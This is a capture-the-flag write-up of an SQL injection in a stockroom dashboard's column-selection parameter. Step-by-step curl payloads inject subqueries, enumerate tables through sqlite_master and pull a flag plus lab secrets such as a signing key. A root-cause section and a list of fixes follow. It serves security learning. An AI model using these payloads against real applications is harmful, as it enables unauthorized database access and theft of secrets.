# PRISM Stockroom Pwnbox Lab - Column Picker SQLi

Date: 2026-07-08
Target type: CTF/lab
Bug class: SQL injection in SELECT list, SQLite subquery exfiltration

## Observation

Internal stockroom dashboard at `https://7acd9c483b53.pwnbox-lab.com/`.

Initial page hints:

- "Pick which columns to surface."
- "The selector drives the live read against the warehouse database."
- Custom view field: "Free-form column expression (overrides preset when filled)."
- Lab goal: flag lives in an audit table outside the inventory schema.

Frontend loads data from:

```javascript
const url = '/api/items?view=' + encodeURIComponent(view);
```

Baseline request:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20price"
```

Returns normal inventory rows with `id`, `name`, `price`.

## Hypothesis

The `view` parameter is interpolated into the SELECT list. If so, a subquery can exfiltrate data from hidden tables while keeping a whitelisted inventory column such as `name` in the expression.

## Evidence

Quote probe:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name'"
```

Error detail:

```text
unrecognized token: "' FROM items ORDER BY id LIMIT 50"
```

Inferred query shape:

```sql
SELECT id, {view} FROM items ORDER BY id LIMIT 50
```

Subquery probe worked:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%201)%20as%20x"
```

Table enumeration:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%20group_concat(name)%20FROM%20sqlite_master%20WHERE%20type='table')%20as%20t"
```

Result: `items secrets`

Schema dump from `sqlite_master` showed:

```sql
CREATE TABLE secrets (
    id INTEGER PRIMARY KEY,
    label TEXT UNIQUE NOT NULL,
    value TEXT NOT NULL
)
```

Flag extraction:

```bash
curl -sS "https://7acd9c483b53.pwnbox-lab.com/api/items?view=name,%20(SELECT%20value%20FROM%20secrets%20WHERE%20label='flag')%20as%20flag"
```

Full secrets dump:

```text
flag=pwnbox{a83f1c4d27e60b95f12d8c4a6e3b9017} | s3_bucket=prism-staging-backups | signing_key=k8s_M9rPx2sZ_signing_2026
```

## Test

1. Confirm normal preset/custom views work.
2. Break syntax with a quote to learn query shape.
3. Inject a scalar subquery in the SELECT list.
4. Enumerate hidden tables through `sqlite_master`.
5. Read `secrets` for the flag label.

## Result

Confirmed chain:

```text
User-controlled column expression
-> interpolated into SELECT list
-> weak allowlist permits subqueries when inventory column present
-> sqlite_master reveals secrets table
-> subquery exfiltrates flag value
```

Flag: `pwnbox{a83f1c4d27e60b95f12d8c4a6e3b9017}`

## Why failed assumptions did not apply

- Direct `FROM audit...` style injection was blocked by allowlist.
- No auth bypass or UNION was needed.
- Hidden data was in another table in the same SQLite database, not another attached schema.

## Root cause

Free-form column expressions were concatenated into SQL. Validation checked for allowed inventory column references but did not prevent subqueries in the expression list.

## Fix

- Replace free-form expressions with a fixed allowlist of column names.
- Never concatenate user input into SELECT lists.
- Use an ORM/query builder with explicit column mapping.
- Separate inventory reads from audit/secret tables at the database permission layer.

## Future checklist item

For "pick your columns" dashboards, test `(SELECT 1) as x` in the column/view parameter before trying UNION or auth bypass payloads.
